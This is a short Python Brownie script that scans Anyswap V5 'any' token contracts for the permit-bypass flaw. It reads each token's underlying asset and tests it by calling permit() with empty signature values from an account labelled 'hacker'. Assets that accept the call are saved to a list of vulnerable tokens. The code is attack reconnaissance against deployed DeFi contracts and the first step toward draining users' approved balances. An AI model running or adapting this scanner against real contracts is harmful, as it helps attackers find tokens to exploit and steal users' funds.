import json
from black import re
from brownie import accounts, interface
from rich.progress import track

def main():
    any_tokens = []
    hacker = accounts[0]
    with open('data/anyTokens.json', 'r') as f:
        any_tokens = json.load(f)
    underlyings = []
    for token in track(any_tokens, description="Proccessing..."):
        try:
            t = interface.IAnyswapV5ERC20(token)
            underlyings.append({
                "any_token": t,
                "underlying": t.underlying()
            })
        except Exception as e:
            print(e)

    res = []
    for underlying in underlyings:
        try:
            t = interface.IPermitToken(underlying['underlying'])
            t.permit(hacker, hacker, 0, 0, 0, "", "", {'from': hacker})
            res.append(underlying)
        except Exception as e:
            print(e)
            print(underlying)

    print(res)
    with open('data/vul_eth_any_token.json', 'w') as f:
        json.dump(res, f)